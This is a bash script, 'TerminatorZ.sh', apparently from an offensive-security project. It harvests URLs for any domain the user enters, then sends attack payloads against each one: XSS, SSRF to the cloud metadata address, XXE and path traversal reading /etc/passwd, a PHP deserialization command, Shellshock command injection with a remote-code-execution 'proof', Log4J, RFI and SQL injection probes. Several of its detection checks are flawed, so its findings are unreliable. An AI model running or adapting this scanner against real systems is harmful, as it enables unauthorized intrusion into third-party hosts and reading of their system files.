#!/bin/bash

# Check if lolcat, fortune-mod, figlet and curl are installed
echo "Installing Dependencies, please wait..." | lolcat
if ! command -v lolcat > /dev/null; then
  echo "lolcat not found, installing..." | lolcat
  if command -v dnf > /dev/null; then
    sudo dnf install -y lolcat
  elif command -v yum > /dev/null; then
    sudo yum install -y lolcat
  elif command -v apt-get > /dev/null; then
    sudo apt-get install -y lolcat
  else
    echo "Error: package manager not found, please install lolcat manually" | lolcat
    exit 1
  fi
fi

if ! command -v fortune > /dev/null; then
  echo "fortune-mod not found, installing..." | lolcat
  if command -v dnf > /dev/null; then
    sudo dnf install -y fortune-mod
  elif command -v yum > /dev/null; then
    sudo yum install -y fortune-mod
  elif command -v apt-get > /dev/null; then
    sudo apt-get install -y fortune-mod
  else
    echo "Error: package manager not found, please install fortune-mod manually" | lolcat
    exit 1
  fi
fi

if ! command -v figlet > /dev/null; then
  echo "figlet not found, installing..." | lolcat
  if command -v dnf > /dev/null; then
    sudo dnf install -y figlet
  elif command -v yum > /dev/null; then
    sudo yum install -y figlet
  elif command -v apt-get > /dev/null; then
    sudo apt-get install -y figlet
  else
    echo "Error: package manager not found, please install figlet manually" | lolcat
    exit 1
  fi
fi

if ! command -v curl > /dev/null; then
  echo "curl not found, installing..."
  if command -v dnf > /dev/null; then
    sudo dnf install -y curl
  elif command -v yum > /dev/null; then
    sudo yum install -y curl
  elif command -v apt-get > /dev/null; then
    sudo apt-get install -y curl
  else
    echo "Error: package manager not found, please install curl manually" | lolcat
    exit 1
  fi
fi

echo "All dependencies installed successfully" | lolcat
sleep 3
clear

curl --silent "https://raw.githubusercontent.com/blackhatethicalhacking/Subdomain_Bruteforce_bheh/main/ascii.sh" | lolcat
echo ""
# Generate a random Sun Tzu quote for offensive security
# Array of Sun Tzu quotes
quotes=("The supreme art of war is to subdue the enemy without fighting." "All warfare is based on deception." "He who knows when he can fight and when he cannot, will be victorious." "The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." "To win one hundred victories in one hundred battles is not the acme of skill. To subdue the enemy without fighting is the acme of skill.")
# Get a random quote from the array
random_quote=${quotes[$RANDOM % ${#quotes[@]}]}

# Print the quote
echo "Offensive Security Tip: $random_quote - Sun Tzu" | lolcat
sleep 1
echo "MEANS, IT'S ☕ 1337 ⚡ TIME, 369 ☯ " | lolcat
sleep 1
figlet -w 80 -f small TerminatorZ | lolcat
echo ""
echo "[YOUR ARE USING TerminatorZ.sh] - (v1.1) CODED BY Chris 'SaintDruG' Abou-Chabké WITH ❤ FOR blackhatethicalhacking.com for Educational Purposes only!" | lolcat
sleep 1
#check if the user is connected to the internet
tput bold;echo "CHECKING IF YOU ARE CONNECTED TO THE INTERNET!" | lolcat
# Check connection
wget -q --spider https://google.com
if [ $? -ne 0 ];then
    echo "++++ CONNECT TO THE INTERNET BEFORE RUNNING TerminatorZ !" | lolcat
    exit 1
fi
tput bold;echo "++++ CONNECTION FOUND, LET'S GO!" | lolcat

echo "Enter the domain: (example.com) "
read domain

if [ -d "$domain" ]; then
  echo "Error: Directory $domain already exists"
  exit 1
else
  mkdir "$domain"
fi

waybackurls $domain | grep -E "\.js$|\.php$|\.yml$|\.env$|\.txt$|\.xml$|\.config$" | httpx -verbose | sort -u | tee urls.txt lolcat

count=$(wc -l < urls.txt)
echo "Total URLs found: $count" | lolcat
# Matrix effect
echo "Let us Terminate them in 5 seconds - Matrix Mode ON:" | toilet --metal -f term -F border

R='\033[0;31m'
G='\033[0;32m'
Y='\033[1;33m'
B='\033[0;34m'
P='\033[0;35m'
C='\033[0;36m'
W='\033[1;37m'

for ((i=0; i<5; i++)); do
    echo -ne "${R}10 ${G}01 ${Y}11 ${B}00 ${P}01 ${C}10 ${W}00 ${G}11 ${P}01 ${B}10 ${Y}11 ${C}00\r"
    sleep 0.2
    echo -ne "${R}01 ${G}10 ${Y}00 ${B}11 ${P}10 ${C}01 ${W}11 ${G}00 ${P}10 ${B}01 ${Y}00 ${C}11\r"
    sleep 0.2
    echo -ne "${R}11 ${G}00 ${Y}10 ${B}01 ${P}00 ${C}11 ${W}01 ${G}10 ${P}00 ${B}11 ${Y}10 ${C}01\r"
    sleep 0.2
    echo -ne "${R}00 ${G}11 ${Y}01 ${B}10 ${P}11 ${C}00 ${W}10 ${G}01 ${P}11 ${B}00 ${Y}01 ${C}10\r"
    sleep 0.2
done
#Start the attacks
while read url
do

# Check for XSS (Cross-site scripting) vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for XSS vulnerability...\e[0m"
response=$(curl -s -H 'User-Agent: Mozilla/5.0' -d "<script>alert('XSS Vulnerability');</script>" "$url")
if [[ $response == *"<script>alert('XSS Vulnerability');</script>"* ]]; then
  echo -e "$url is XSS \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not XSS \e[31mvulnerable\e[0m"
fi

# Check for SSRF (Server-side request forgery) vulnerability

echo -e "\e[33mTesting \e[0m${url}\e[33m for SSRF vulnerability...\e[0m"
response=$(curl -s -H 'User-Agent: Mozilla/5.0' "$url?url=http://169.254.169.254/")
if [[ $response == *"169.254.169.254"* ]]; then
  echo -e "$url is SSRF \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not SSRF \e[31mvulnerable\e[0m"
fi

# Check for XXE (XML external entity) vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for XXE vulnerability...\e[0m"
response=$(curl -s -H 'User-Agent: Mozilla/5.0' -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "$url")
if [[ $response == *"root:x"* ]]; then
  echo -e "$url is XXE \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not XXE \e[31mvulnerable\e[0m"
fi

# Check for Insecure deserialization vulnerability:
echo -e "\e[33mTesting \e[0m${url}\e[33m for Insecure Deserialization vulnerability...\e[0m"
response=$(curl -s -H 'User-Agent: Mozilla/5.0' -d 'O:8:"stdClass":1:{s:5:"shell";s:5:"touch /tmp/pwned";}' "$url")
if [[ -f "/tmp/pwned" ]]; then
  echo -e "$url is insecure deserialization \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not insecure deserialization \e[31mvulnerable\e[0m"
fi

# Check for Remote Code Execution via Shellshock vulnerability:
echo -e "\e[33mTesting \e[0m${url}\e[33m for Shellshock vulnerability...\e[0m"
response=$(curl -s -H "User-Agent: () { :; }; /bin/bash -c 'echo vulnerable'" "$url")
if [[ $response == *"vulnerable"* ]]; then
  echo -e "$url is \e[32mvulnerable\e[0m to Shellshock RCE" >> "$domain/$domain.txt"
  # Execute arbitrary command as proof of concept
  echo "Executing arbitrary command as proof of concept..."
  response=$(curl -s -H "User-Agent: () { :; }; /bin/bash -c 'echo SHELLSHOCK_RCE_DEMO'" "$url")
  if [[ $response == *"SHELLSHOCK_RCE_DEMO"* ]]; then
    echo "Successful RCE via Shellshock vulnerability"
  else
    echo "Failed to execute arbitrary command"
  fi
else
  echo -e "$url is not \e[31mvulnerable\e[0m to Shellshock RCE" 
fi

  # Check for RCE vulnerability
  echo -e "\e[33mTesting \e[0m${url}\e[33m for RCE vulnerability...\e[0m"
response=$(curl -s -H 'User-Agent: () { :;}; echo vulnerable' "$url")
if [[ $response == *"vulnerable"* ]]; then
  echo -e "$url is RCE \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not RCE \e[31mvulnerable\e[0m"
fi

echo -e "\e[33mTesting \e[0m${url}\e[33m for CSRF vulnerability...\e[0m"
response=$(curl -s -X POST -d 'token=test' "$url")
if [[ $response == *"token=test"* ]]; then
  echo -e "$url is CSRF \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not CSRF \e[31mvulnerable\e[0m"
fi


  # Check for LFI vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for LFI vulnerability...\e[0m"
response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
if [[ $response == *"root:"* ]]; then
  echo -e "$url is LFI \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not LFI \e[31mvulnerable\e[0m"
fi

  # Check for open redirect vulnerability
  echo -e "\e[33mTesting \e[0m${url}\e[33m for Open Redirect vulnerability...\e[0m"
  response=$(curl -s -L "$url?redirect=http://google.com")
  if [[ $response == *"<title>Google</title>"* ]]; then
    echo -e "$url is open redirect \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
  else
    echo -e "$url is not open redirect \e[31mvulnerable\e[0m"
  fi

  # Check for Log4J vulnerability
  echo -e "\e[33mTesting \e[0m${url}\e[33m for Log4J vulnerability...\e[0m"
  response=$(curl -s "$url/%20%20%20%20%20%20%20%20@org.apache.log4j.BasicConfigurator@configure()")
  if [[ $response == *"log4j"* ]]; then
    echo -e "$url is Log4J \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
  else
    echo -e "$url is not Log4J \e[31mvulnerable\e[0m"
  fi

  # Check for RFI vulnerability
  echo -e "\e[33mTesting \e[0m${url}\e[33m for RFI vulnerability...\e[0m"
  response=$(curl -s "$url?file=http://google.com")
  if [[ $response == *"<title>Google</title>"* ]]; then
    echo -e "$url is RFI \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
  else
    echo -e "$url is not RFI \e[31mvulnerable\e[0m"
  fi
 # Check for directory traversal vulnerability
 echo -e "\e[33mTesting \e[0m${url}\e[33m for path/directory traversal vulnerability...\e[0m"
response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
if [[ $response == *"root:"* ]]; then
  echo -e "$url is path traversal \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not path traversal \e[31mvulnerable\e[0m"
fi
# Check for SQL injection vulnerability
echo -e "\e[33mTesting \e[0m${url}\e[33m for SQL injection vulnerability...\e[0m"
response=$(curl -s "$url/index.php?id=1'")
if [[ $response == *"SQL syntax"* ]]; then
  echo -e "$url is SQL injection \e[32mvulnerable\e[0m" >> "$domain/$domain.txt"
else
  echo -e "$url is not SQL injection \e[31mvulnerable\e[0m"
fi
done < urls.txt
mv urls.txt $domain
rm -rf lolcat
echo "Targets have been T3rm1nat3d... I'll be back!" | lolcat
